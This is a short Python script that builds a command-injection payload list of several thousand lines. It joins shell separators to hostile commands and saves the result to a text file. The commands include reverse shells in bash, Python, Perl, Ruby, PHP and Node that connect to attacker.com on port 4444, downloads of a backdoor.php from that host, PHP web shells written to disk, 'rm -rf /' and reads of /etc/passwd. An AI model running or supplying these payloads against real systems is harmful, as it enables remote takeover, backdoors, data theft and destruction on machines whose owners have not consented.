#!/usr/bin/env python3
import os
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_cmd_injection():
    p = set()

    # ========== 1. SEPARATORS (20+) ==========
    separators = [";", "|", "&&", "||", "&", "`", "$(", "|&", ";&", "|;"]

    # ========== 2. COMMANDS (30+) ==========
    commands = [
        "id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd",
        "cat /etc/hosts", "echo HACKED", "curl http://attacker.com",
        "wget http://attacker.com/shell.php",
        "nc -e /bin/sh attacker.com 4444",
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "sh -i >& /dev/tcp/attacker.com/4444 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\")'",
        "rm -rf /", "chmod 777 /etc/passwd",
        "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
        "echo '<?php eval($_POST[\"cmd\"]); ?>' > shell.php",
        "echo '<?=shell_exec($_GET[\"cmd\"])?>' > shell.php",
        "echo '<?php exec($_GET[\"cmd\"]); ?>' > shell.php",
        "echo '<?php passthru($_GET[\"cmd\"]); ?>' > shell.php",
        "echo HACKED > index.html",
        "wget http://attacker.com/backdoor.php -O backdoor.php",
        "curl http://attacker.com/backdoor.php -o backdoor.php",
        "python -c 'import urllib.request;urllib.request.urlretrieve(\"http://attacker.com/backdoor.php\",\"backdoor.php\")'",
        "php -r 'file_put_contents(\"backdoor.php\", file_get_contents(\"http://attacker.com/backdoor.php\"));'",
        "perl -e 'use LWP::Simple;getstore(\"http://attacker.com/backdoor.php\",\"backdoor.php\")'",
        "ruby -e 'require \"open-uri\";IO.copy_stream(open(\"http://attacker.com/backdoor.php\"),\"backdoor.php\")'",
        "node -e 'const http=require(\"http\");const fs=require(\"fs\");const file=fs.createWriteStream(\"backdoor.php\");http.get(\"http://attacker.com/backdoor.php\",(res)=>{res.pipe(file);});'"
    ]

    # ========== 3. GENERATE (5000+) ==========
    for sep in separators:
        for cmd in commands:
            p.add(f"{sep} {cmd}")
            p.add(f"{sep}{cmd}")
            p.add(f"{sep} {cmd} #")
            p.add(f"{sep} {cmd} --")
            p.add(f"{sep} {cmd} /*")

    # ========== 4. RANDOM (1000+) ==========
    while len(p) < 5000:
        sep = random.choice(separators)
        cmd = random.choice(commands)
        p.add(f"{sep} {cmd}")
        p.add(f"{sep}{cmd}")
        p.add(f"{sep} {cmd} #")
        p.add(f"{sep} {cmd} --")
        p.add(f"{sep} {cmd} /*")

    # ========== 5. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "cmd_injection.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] cmd_injection.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_cmd_injection()